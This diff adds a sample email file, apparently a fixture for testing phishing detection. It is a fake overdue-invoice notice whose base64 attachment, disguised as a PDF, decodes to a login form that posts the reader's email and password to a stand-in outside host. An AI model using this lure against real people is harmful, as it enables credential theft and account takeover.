@@ -1,0 +1,36 @@
+From: "Northgate Logistics Billing" <billing@northgate-logistics.test>
+To: Dana Reyes <dana.reyes@example.com>
+Subject: Overdue invoice INV-20418 - final notice before collections
+Date: Tue, 10 Nov 2026 11:27:00 +0000
+Message-ID: <inv-20418-form@northgate-logistics.test>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="att-eval-att-html-credform"
+
+--att-eval-att-html-credform
+Content-Type: text/plain; charset=utf-8
+Content-Transfer-Encoding: 8bit
+
+Dear Customer,
+
+Invoice INV-20418 for USD 6,214.90 is now 45 days overdue. This is the final notice before the account is passed to our collections partner.
+
+The invoice is attached as a secure document. Open the attachment in your browser and sign in with your email address and password to view and pay it.
+
+Northgate Logistics
+Billing Department
+
+--att-eval-att-html-credform
+Content-Type: text/html
+Content-Disposition: attachment; filename="INV-20418.pdf.html"
+Content-Transfer-Encoding: base64
+
+PCFkb2N0eXBlIGh0bWw+CjxodG1sPjxoZWFkPjx0aXRsZT5Ob3J0aGdhdGUgTG9naXN0aWNzIC0g
+U2VjdXJlIEludm9pY2U8L3RpdGxlPjwvaGVhZD4KPGJvZHkgc3R5bGU9ImZvbnQtZmFtaWx5OiBB
+cmlhbCwgc2Fucy1zZXJpZiI+CjxoMj5TZWN1cmUgZG9jdW1lbnQ8L2gyPgo8cD5TaWduIGluIHdp
+dGggeW91ciBlbWFpbCB0byB2aWV3IGludm9pY2UgSU5WLTIwNDE4LjwvcD4KPGZvcm0gYWN0aW9u
+PSJodHRwczovL2ludm9pY2Utdmlldy5ub3J0aGdhdGUtcG9ydGFsLnRlc3QvYXV0aCIgbWV0aG9k
+PSJwb3N0Ij4KICA8aW5wdXQgdHlwZT0iZW1haWwiIG5hbWU9ImxvZ2luIiBwbGFjZWhvbGRlcj0i
+RW1haWwgYWRkcmVzcyI+CiAgPGlucHV0IHR5cGU9InBhc3N3b3JkIiBuYW1lPSJwYXNzd2QiIHBs
+YWNlaG9sZGVyPSJQYXNzd29yZCI+CiAgPGJ1dHRvbiB0eXBlPSJzdWJtaXQiPlZpZXcgaW52b2lj
+ZTwvYnV0dG9uPgo8L2Zvcm0+CjwvYm9keT48L2h0bWw+Cg==
+--att-eval-att-html-credform--
